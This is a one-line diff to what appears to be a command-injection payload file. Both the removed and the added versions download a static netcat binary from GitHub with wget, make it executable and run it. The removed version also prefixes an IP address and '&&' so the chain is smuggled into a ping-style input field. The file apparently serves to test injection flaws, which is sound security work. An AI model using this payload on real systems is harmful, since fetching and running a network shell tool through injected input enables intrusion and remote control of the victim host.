@@ -1,1 +1,1 @@
-8.8.8.8 && wget -q https://github.com/yunchih/static-binaries/raw/master/nc && chmod +x nc && ./nc -V
+wget -q https://github.com/yunchih/static-binaries/raw/master/nc && chmod +x nc && ./nc -V
